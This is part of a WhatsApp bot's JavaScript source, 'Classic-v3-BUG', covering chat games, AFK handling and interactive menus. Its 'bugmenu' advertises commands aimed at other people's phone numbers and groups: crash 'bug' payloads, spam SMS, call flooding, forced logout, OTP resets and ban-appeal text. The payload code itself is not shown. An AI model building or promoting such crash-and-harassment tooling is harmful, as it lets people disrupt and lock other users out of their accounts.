if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== from)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = from
if (room.x !== room.o) await zetsubo.sendText(room.x, str, m, { mentions: parseMention(str) } )
await zetsubo.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}

//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
zetsubo.sendTextWithMentions(from, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'trend'
roof.asal = from
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
zetsubo.sendText(from, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) zetsubo.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) zetsubo.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) zetsubo.sendText(from, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
zetsubo.sendTextWithMentions(from, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) zetsubo.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) zetsubo.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
zetsubo.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
reply(`Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
reply(`
Telah Kembali Dari Afk ${user.afkReason ? ' Selama ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

//=================================================//
switch(command) {

case 'assalamualaikum': {
zetsubo.sendMessage(from, { text: `Waalaikumsalam `}, {quoted:m })
}
break
//=================================================//
case "getcase":
if (!isCreator) return reply('*𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐮𝐬𝐞𝐫𝐬 𝐨𝐧𝐥𝐲*')
await loading()
if (!args[0]) return m.reply("Mau ngambil case apa?")
try{
zetsreply(getCase(args[0]))
} catch {
m.reply("Case Tidak Ditemukan")
}
break
//=================================================//
case 'menu': case 'help': {
let menutxt = `
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
    \`𝘾𝙇𝘼𝙎𝙎𝙄𝘾-𝙑3 𝘽𝙐𝙂\`
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
   ✰ 𝐒𝐜 𝐏𝐮𝐛𝐥𝐢𝐜 ❴ 𝐵𝑌 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 ❵
   ✰ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫: 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
   ✰ 𝐔𝐬𝐞𝐫 : @${m.sender.split('@')[0]}
 
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
    ✦ 𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : 𝐁𝐚𝐢𝐥𝐞𝐲𝐬-𝐌𝐃.
    ✦ 𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐮𝐥𝐭𝐢-𝐏𝐫𝐞𝐟𝐢𝐱.
    ✦ 𝐃𝐚𝐭𝐞 𝐒𝐞𝐫𝐯𝐞𝐫 : ${moment.tz('Africa/Nairobi').format('DD/MM/YY')}
    ✦ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
 
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬`

/*try {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: menutxt
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: "Classic-v3-BUG"
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : { url: "https://telegra.ph/file/6dfde4263655a81572a68.jpg" }}, { upload: zetsubo.waUploadToServer})),
                  title: ``,
                  gifPlayback: true,
                  subtitle: "𝕶𝖎𝖓𝖌 𝕾𝖆𝖓",
                  hasMediaAttachment: false
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson":
`{"title":"MENU🗒️",
"sections":[{"title":" 🎩𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆🧣",
"rows":[{"header":"🔖 𝙰𝙳𝙳 𝙼𝙴𝙽𝚄 🔖",
"title":"",
"description":"Addmenu 🕷️",
"id":".addmenu"},
{"header":"📔𝐕𝐂𝐅 𝐌𝐄𝐍𝐔 🪡",
"title":"",
"description":"Pushmenu 👁️",         
"id":".pushmenu"},
{"header":"🐬 𝐅𝐔𝐍 𝐌𝐄𝐍𝐔 🐳",
"title":"",
"description":"Funmenu 💫",
"id":".funmenu"},
{"header":"🌪️ 𝐏𝐈𝐍𝐆 🪐",
"title":"",
"description":"Ping ⚡",
"id":".ping"},
{"header":" 🎧 𝐌𝐔𝐒𝐈𝐂 𝐌𝐄𝐍𝐔 🎤",
"title":"",
"description":"Listmusik 🎉",
"id":".listmusik"},
{"header":"🛹 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐌𝐄𝐍𝐔 ⛷",
"title":"",
"description":"Downloadmenu 🪀",
"id":".downloadmenu"},
{"header":"🪃 𝐆𝐀𝐌𝐄 𝐌𝐄𝐍𝐔 ⛳",
"title":"",
"description":"Gamemenu 🥳",
"id":".gamemenu"},
{"header":"RANDOM MENU",
"title":"",
"description":"List Random Commands",
"id":".randommenu"},
{"header":" 🥌 𝐀𝐋𝐈𝐕𝐄 🤸‍♂️",
"title":"",
"description":"Alive 🌛",
"id":".alive"},
{"header":"🌘 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔 🌑",
"title":"",
"description":"GROUPMENU 🫴",
"id":".groupmenu"},
{"header":"👤 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 👤",
"title":"",
"description":"Ownermenu 🤖",
"id":".ownermenu"},
{"header":"☄️𝐑𝐔𝐍𝐓𝐈𝐌𝐄 💥",
"title":"",
"description":"Runtime",
"id":".runtime"},
{"header":"🗣️𝐎𝐖𝐍𝐄𝐑 🕊️",
"title":"",
"description":".owner",
"id":".owner"},
{"header":"🗿 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 🦋",
"title":"",                                   
"description":"Bugmenu 👾",
"id":".bugmenu"}]
}]
}`
              },
                     {
                        "name": "cta_url",
                        "buttonParamsJson": "{\"display_text\":\"𝐑𝐞𝐩𝐨🔗\",\"url\":\"https://github.com/Samue-l1/Classic-v3-BUG\",\"merchant_url\":\"https://github.com/Samue-l1/Classic-v3-BUG\"}"
                      },
		      {
                        "name": "cta_url",
                        "buttonParamsJson": "{\"display_text\":\"𝐂𝐡𝐚𝐧𝐧𝐞𝐥📍 \",\"url\":\"https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e\"}"
		      },
		      {
                       "name": "cta_url",
                        "buttonParamsJson": "{\"display_text\":\"𝐎𝐰𝐧𝐞𝐫👤 \",\"url\":\"https://wa.me/+263711348801?text=Hello+King+Sam\",\"merchant_url\":\"https://wa.me/+254742491666?text=Hello+King+Tarlife\"}"
		      },
		      {
                        "name": "cta_url",
                        "buttonParamsJson": "{\"display_text\":\"𝐇𝐨𝐰 𝐓𝐨 𝐃𝐞𝐩𝐥𝐨𝐲 📺\",\"url\":\"https://youtube.com/@king_sam_hub\",\"merchant_url\":\"https://youtube.com/@king_sam_hub\"}"
		}],
          }),
          contextInfo: {
                  mentionedJid: [m.sender],
                  forwardingScore: 999,                                         
		  isForwarded: true,
                  forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363288746972771@newsleter',
                  newsletterName: "Classic-v3-BUG",
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await zetsubo.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
	} catch (error) {
          console.error('Error generating and relaying message:', error);
          return reply('Error generating and relaying message.');
}

}*/
try {
let msg = generateWAMessageFromContent(m.key.remoteJid, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  body: proto.Message.InteractiveMessage.Body.create({
                    text: menutxt,
                  }),
                  footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "King Sam"
                  }),
                  header: proto.Message.InteractiveMessage.Header.create({
		    ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/6dfde4263655a81572a68.jpg' } }, { upload: zetsubo.waUploadToServer })),
                    title: "",
                    subtitle: "Classic-v3-BUG",
                    hasMediaAttachment: false
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
		       {
                        "name": "quick_reply",
                        "buttonParamsJson": `{"display_text":"MENU List🚀","id":"${prefix}taira"}`                                     
		       },
			{
                        "name": "quick_reply",
                        "buttonParamsJson": `{"display_text":"PING 💤","id":"${prefix}ping"}`                                    
			},
			{
                        "name": "quick_reply",
                        "buttonParamsJson": `{"display_text":"☄️𝐑𝐔𝐍𝐓𝐈𝐌𝐄 💥","id":"${prefix}runtime"}`                                     
			},
		      {
                        "name": "cta_url",
                        "buttonParamsJson": "{\"display_text\":\"𝐂𝐡𝐚𝐧𝐧𝐞𝐥📍 \",\"url\":\"https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e\"}"
		      },
		      {
                       "name": "cta_url",
                        "buttonParamsJson": "{\"display_text\":\"𝐎𝐰𝐧𝐞𝐫👤 \",\"url\":\"https://wa.me/+254742491666?text=Hello+King+Sam\",\"merchant_url\":\"https://wa.me/+254742491666?text=Hello+King+Sam\"}"
		      },
		      {
                        "name": "cta_url",
                        "buttonParamsJson": "{\"display_text\":\"𝐇𝐨𝐰 𝐓𝐨 𝐃𝐞𝐩𝐥𝐨𝐲 📺\",\"url\":\"https://youtube.com/@king_sam_hub\",\"merchant_url\":\"https://youtube.com/@king_sam_hub\"}"
		      },
                    ]
                  })
                })
              }
            }
          }, {});

          if (!msg || !msg.key || !msg.key.remoteJid || !msg.key.id) {
            const errorMessage = 'Error: Invalid message key.';
            console.error(errorMessage);
            return reply(errorMessage);
          }

          await zetsubo.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id
          });
        } catch (error) {
          console.error('Error generating and relaying message:', error);
          return reply('Error generating and relaying message.');
	}
} 
break
//=================================================//
case 'taira': {
try {
let msg = generateWAMessageFromContent(m.key.remoteJid, {
            viewOnceMessage: {
              message: {
                "messageContextInfo": {
                  "deviceListMetadata": {},
                  "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  body: proto.Message.InteractiveMessage.Body.create({
                    text: "Click Me 🚀",
                  }),
                  footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "King Sam"
                  }),
                  header: proto.Message.InteractiveMessage.Header.create({
		   ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/6dfde4263655a81572a68.jpg' } }, { upload: zetsubo.waUploadToServer })),
                    title: "",
                    subtitle: "Classic-v3-BUG",
                    hasMediaAttachment: false
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
		       {
                        "name": "quick_reply",
                        "buttonParamsJson": `{"display_text":"Ownermenu 🤖","id":"${prefix}ownermenu"}`                                     
		       },
			{
                        "name": "quick_reply",
                        "buttonParamsJson": `{"display_text":"Bugmenu 👾","id":"${prefix}bugmenu"}`                                    
			},
			{
                        "name": "quick_reply",
                        "buttonParamsJson": `{"display_text":"GROUPMENU 🫴","id":"${prefix}groupmenu"}`                                     
			},
			{
                        "name": "quick_reply",
                        "buttonParamsJson": `{"display_text":"RANDOMMENU 🙋","id":"${prefix}randommenu"}`                                     
			},
			{
                        "name": "quick_reply",
                        "buttonParamsJson": `{"display_text":"Gamemenu 🥳","id":"${prefix}gamemenu"}`                                    
			},
			{
                        "name": "quick_reply",
                        "buttonParamsJson": `{"display_text":"Downloadmenu 🪀","id":"${prefix}downloadmenu"}`                                   
			},
			{
                        "name": "quick_reply",
                        "buttonParamsJson": `{"display_text":"Listmusik 🎉","id":"${prefix}listmusik"}`                                     
			},
			{
                        "name": "quick_reply",
                        "buttonParamsJson": `{"display_text":"Funmenu 💫","id":"${prefix}funmenu"}`                                     
			},
			{
                        "name": "quick_reply",
                        "buttonParamsJson": `{"display_text":"Pushmenu 👁️","id":"${prefix}pushmenu"}`                                     
			},
			{
                        "name": "quick_reply",
                        "buttonParamsJson": `{"display_text":"Addmenu 🕷️","id":"${prefix}addmenu"}`                                     },
                    ]
                  })
                })
              }
            }
          }, {});

          if (!msg || !msg.key || !msg.key.remoteJid || !msg.key.id) {
            const errorMessage = 'Error: Invalid message key.';
            console.error(errorMessage);
            return reply(errorMessage);
          }

          await zetsubo.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id
          });
        } catch (error) {
          console.error('Error generating and relaying message:', error);
          return reply('Error generating and relaying message.');
	} 
}
break
//=================================================//
case 'bugmenu': {

                            ewe = `┏━━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━━━━━━
┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 Tarlife ❵
┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
┃  ➥𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
┃
┣╼╼❴ ⧠ ᏴϴͲ ᏆΝҒϴ ⧠ ❵╼╼╼
┃
┃    📚𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Tarlife-𝐌𝐃*.
┃	👾𝐏𝐫𝐞𝐟𝐢𝐱 : *𝐌𝐮𝐥𝐭𝐢-𝐏𝐫𝐞𝐟𝐢𝐱*.
┃	📅𝐃𝐚𝐭𝐞 𝐒𝐞𝐫𝐯𝐞𝐫 : ${moment.tz('Africa/Nairobi').format('DD/MM/YY')}
┃	🕑𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
┃
┣━━━━━━ 𝗔𝗱𝗱 𝗔𝗰𝗰𝗲𝘀 ━━━━━━
┃
┃┏━━━━━━━━━━━━━━━━━━
┃➢ 𝐚𝐝𝐝𝐩𝐫𝐞𝐦 (628xx/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦𝐢𝐮𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐥𝐢𝐬𝐭𝐩𝐫𝐞𝐦
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐚𝐝𝐝 (628𝐱𝐱)
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐝𝐞𝐥 (628𝐱𝐱)
┃➢ 𝐥𝐢𝐬𝐭𝐛𝐚𝐧
┃➢ 𝐩𝐮𝐛𝐥𝐢𝐜
┃➢ 𝐬𝐞𝐥𝐟
┃┗━━━━━━━━━━━━━━━━━━
┃
┣━━━━━❴ 𝑩𝑼𝑮 𝑴𝑬𝑵𝑼 ❵━━━━━
┃┏━━━❴ BUG + 𝑵𝒖𝒎𝒃𝒆𝒓 ❵━━━
┃➟ unliattention 62852X
┃➟ unlipending 62852X
┃➟ unlischedule 62852X
┃➟ cheduleunliios 62852X
┃➟ xios 62852X
┃➟ xandro 62852X
┃➟ xsistem 62852X
┃➟ xschedule 62852X
┃➟ ++schedule 62852X
┃➟ scheduleobject 62852X
┃➟ eatmydickk 62852X
┣━━━━━━━━━━━━━━━━
┃   ➥➥❴⧠ 𝐁𝐘 Tarlife ⧠❵➥➥
┣━━━━━━━━━━━━━━━━
┃┏━━❴ 𝑩𝑼𝑮 + 𝑵𝒖𝒎𝒃𝒆𝒓 ❵━━━
┃➟ 𝒖𝒏𝒍𝒊𝒂𝒕𝒕𝒆𝒏𝒕𝒊𝒐𝒏 62852𝑿
┃➟ 𝒖𝒏𝒍𝒊𝒑𝒆𝒏𝒅𝒊𝒏𝒈 62852𝑿
┃➟ 𝒖𝒏𝒍𝒊𝒔𝒄𝒉𝒆𝒅𝒖𝒍𝒆 62852𝑿
┃➟ 𝒄𝒉𝒆𝒅𝒖𝒍𝒆𝒖𝒏𝒍𝒊𝒊𝒐𝒔 62852𝑿
┃➟ 𝒙𝒊𝒐𝒔 62852𝑿
┃➟ 𝒙𝒂𝒏𝒅𝒓𝒐 62852𝑿
┃➟ 𝒙𝒔𝒊𝒔𝒕𝒆𝒎 628𝒆 62852𝑿
┃➟ 𝒔𝒄𝒉𝒆𝒅𝒖𝒍𝒆𝒐𝒃𝒋𝒆𝒄𝒕 62852𝑿
┃➟ 𝒆𝒂𝒕𝒎𝒚𝒅𝒊𝒄𝒌𝒌 62852𝑿
┣━━━━━━━━━━━━━━━━━
┃  ➥➥❴⧠ 𝐁𝐘 Tarlife ⧠❵➥➥
┣━━━━━━━━━━━━━━━━━
┃┏╼╼╼❴ 𝑩𝑼𝑮 𝑮𝑹𝑶𝑼𝑷 ❵╼╼╼╼
┃➟ 𝒖𝒏𝒍𝒊𝒅𝒆𝒍𝒂𝒚𝒈𝒄 (𝑰𝑫 𝑮𝑹𝑶𝑼𝑷)
┃➟ 𝒙𝒈𝒓𝒐𝒖𝒑 (𝑰𝑫 𝑮𝑹𝑶𝑼𝑷)
┃➟ 𝒛𝒆𝒕𝒔𝒃𝒓𝒆𝒂𝒌 (𝑮𝑹𝑶𝑼𝑷 𝑳𝑰𝑵𝑲)
┃➟ 𝒛𝒆𝒕𝒔𝒊𝒏𝒕𝒆𝒓𝒏𝒂𝒍 (𝑮𝑹𝑶𝑼𝑷 𝑳𝑰𝑵𝑲)
┃➟ 𝒃𝒖𝒈𝒈𝒄𝒗 (𝑮𝑹𝑶𝑼𝑷 𝑳𝑰𝑵𝑲)
┃➟ 𝒃𝒖𝒈𝒈𝒄𝒘 (𝑮𝑹𝑶𝑼𝑷 𝑳𝑰𝑵𝑲)
┃➟ 𝒃𝒖𝒈𝒈𝒄𝒙 (𝑮𝑹𝑶𝑼𝑷 𝑳𝑰𝑵𝑲)
┃➟ 𝒃𝒖𝒈𝒈𝒄𝒚 (𝑮𝑹𝑶𝑼𝑷 𝑳𝑰𝑵𝑲)
┃➟ 𝒃𝒖𝒈𝒈𝒄𝒛 (𝑮𝑹𝑶𝑼𝑷 𝑳𝑰𝑵𝑲)
┃➟ 𝒂𝒕𝒕𝒆𝒏𝒕𝒊𝒐𝒏𝒗 (𝑮𝑹𝑶𝑼𝑷 𝑳𝑰𝑵𝑲)
┃➟ 𝒂𝒕𝒕𝒆𝒏𝒕𝒊𝒐𝒏𝒘 (𝑮𝑹𝑶𝑼𝑷 𝑳𝑰𝑵𝑲)
┃➟ 𝒂𝒕𝒕𝒆𝒏𝒕𝒊𝒐𝒏𝒛 (𝑮𝑹𝑶𝑼𝑷 𝑳𝑰𝑵𝑲)
┃➟ 𝒈𝒂𝒔𝒇𝒖𝒍𝒍𝒈𝒄 (𝑮𝑹𝑶𝑼𝑷 𝑳𝑰𝑵𝑲)
┣━━━━━━━━━━━━━━━━━━
┃  ➥❴⧠ *𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 ®2024* ⧠❵➥
┃━━━━━━━━━━━━━━━━━━
┃┏━━❴ 𝑺𝑬𝑵𝑫 𝑩𝑼𝑮 𝑫𝑰𝑹𝑬𝑪𝑻 ❵━━
┃➟ 𝒈𝒆𝒕𝒂𝒕𝒕𝒆𝒏𝒕𝒊𝒐𝒏𝒃𝒖𝒈
┃➟ 𝒅𝒊𝒓𝒆𝒄𝒕𝒂𝒕𝒕𝒆𝒏𝒕𝒊𝒐𝒏
┃➟ 𝒔𝒄𝒉𝒆𝒅𝒖𝒍𝒆𝒎𝒂𝒔𝒕𝒆𝒓
┃➟ 𝒔𝒔𝒔𝒂𝒕𝒕𝒆𝒏𝒕𝒊𝒐𝒏
┃➟ 𝒎𝒖𝒍𝒕𝒊𝒂𝒕𝒕𝒆𝒏𝒕𝒊𝒐𝒏
┃➟ 𝒖𝒏𝒍𝒊𝒅𝒆𝒍𝒂𝒚
┃➟ 𝒖𝒏𝒍𝒊𝒍𝒂𝒈
┃➟ 𝒖𝒏𝒍𝒊𝒃𝒐𝒎
┃➟ 𝒖𝒏𝒍𝒊𝒃𝒓𝒆𝒂𝒌
┃➟ 𝒖𝒏𝒍𝒊𝒄𝒂𝒍𝒍
┃➟ 𝒊𝒄𝒂𝒍𝒍
┃➟ 𝒔𝒄𝒉𝒆𝒅𝒖𝒍𝒆𝒄𝒂𝒍𝒍++
┃➟ 30𝒄𝒂𝒍𝒍
┃➟ 𝒗𝒊𝒓𝒑𝒆𝒏
┃➟ 𝒄𝒂𝒍𝒍𝒅𝒆𝒍𝒂𝒚
┃┗━━━━━━━━━━━━━━━━━━
┃➥❴❏ 𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 ®2024⧠❵ ➥        
┣━━━━━━━━━━━━━━━━━━━
┣━━━━━━━❴ 𝑺𝒑𝒆𝒄𝒊𝒂𝒍 ❵━━━━━
┃
┃┏╼╼╼╼❴ 𝑫𝑰𝑺𝑻𝑼𝑹𝑩𝑨𝑵𝑪𝑬 ❵╼╼╼╼
┃᪣ 𝒔𝒑𝒂𝒎𝒔𝒎𝒔 (628𝒙𝒙)
┃᪣ 𝒄𝒂𝒍𝒍 (628𝒙𝒙)
┃┗╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼
┃    ➥➥➥➥❴ 𝑩𝒀 𝑺𝑨𝑴 ❵➥➥➥➥
┣╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼
┃┏╼❴ 𝑼𝑵𝑩𝑨𝑵𝑵 𝑻𝑬𝑿𝑻 ❵╼╼╼╼╼╼╼╼
┃➢ 𝒖𝒏𝒃𝒂𝒏𝒗1 62852𝑿
┃➢ 𝒖𝒏𝒃𝒂𝒏𝒗2 62852𝑿
┃➢ 𝒖𝒏𝒃𝒂𝒏𝒗3 62852𝑿
┃➢ 𝒖𝒏𝒃𝒂𝒏𝒗4 62852𝑿
┃➢ 𝒖𝒏𝒃𝒂𝒏𝒗5 62852𝑿
┃┗╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼
┃
┃┏╼╼╼╼❴ 𝑹𝑬𝑺𝑬𝑻 𝑾𝑨 𝑶𝑻𝑷 ❵╼╼╼╼╼
┃✇ 𝒓𝒆𝒔𝒆𝒕𝒐𝒕𝒑 62852𝑿
┃┗╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼
┃
┃┏╼╼❴ 𝑪𝑹𝑬𝑨𝑻𝑬 𝑻𝑬𝑿𝑻 𝑼𝑵𝑩𝑨𝑵 ❵╼╼╼╼
┃➟ 𝒄𝒓𝒆𝒂𝒕𝒆𝒖𝒏𝒃𝒂𝒏1
┃➟ 𝒄𝒓𝒆𝒂𝒕𝒆𝒖𝒏𝒃𝒂𝒏2
┃➟ 𝒄𝒓𝒆𝒂𝒕𝒆𝒖𝒏𝒃𝒂𝒏3
┃➟ 𝒄𝒓𝒆𝒂𝒕𝒆𝒖𝒏𝒃𝒂𝒏4
┃➟ 𝒕𝒆𝒙𝒕𝒖𝒏𝒃𝒂𝒏1
┃➟ 𝒕𝒆𝒙𝒕𝒖𝒏𝒃𝒂𝒏2
┃➟ 𝒕𝒆𝒙𝒕𝒖𝒏𝒃𝒂𝒏3
┃➟ 𝒕𝒆𝒙𝒕𝒖𝒏𝒃𝒂𝒏4
┃┗╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼
┃   ➥➥➥❴⧠ 𝑩𝒀 Tarlife ⧠❵➥➥➥➥
┣╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼
┃┏⊱ 𝑳𝑶𝑮𝑶𝑼𝑻 (𝑲𝑯𝑼𝑺𝑼𝑺 62)
┃➟ 𝒌𝒆𝒏𝒐𝒏𝒊𝒏 62852𝑿
┃➟ 𝒗𝒆𝒓𝒊𝒇𝒚 62852𝑿
┃➟ 𝒋𝒆𝒃0𝒍 62852𝑿
┃➟ 𝒖𝒏𝒃𝒂𝒏𝒗1 62852𝑿
┃┗━━━━━━━━━━━━━━━━━━━━━━━
┃   ➥➥❴⧠ *𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 ®2024* ⧠❵➥➥
┗━━━━━━━━━━━━━━━━━━━━━━━━
 
`
let hiks = {
image: cewegw, 
  caption: ewe,
  contextInfo:{externalAdReply:{
  title: 'ᚙᚘ ⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 ⧉⸙⫺   - 𝐊ᚗ𝐈𝐍ᚗ𝐆 ᚘᚙ',
  body: 'ᚙᚘ ⫹⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉⸙⫺᚜𝐌𝐈𝐒𝐒𝐈𝐎𝐍᚛ ᚘᚙ', 
  showAdAttribution: true,
  thumbnail:hinachan,
  mediaType: 4,
